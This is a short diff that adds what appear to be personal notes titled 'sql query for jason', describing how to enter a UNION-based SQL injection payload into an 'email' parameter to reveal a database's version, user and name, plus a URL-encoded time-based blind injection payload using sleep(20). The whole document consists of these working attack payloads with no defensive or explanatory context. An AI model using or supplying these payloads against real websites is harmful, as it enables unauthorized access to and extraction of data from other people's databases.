@@ -1,0 +1,5 @@
+sql query for jason
+
+On request box, i input this SQL command in “email” parameter ‘ and 1=2 union all select concat_ws(0x3a,version(),user(),database()) — and click Go (this command will show version, user and database name)
+
+'%2b(select*from(select(sleep(20)))a)%2b'
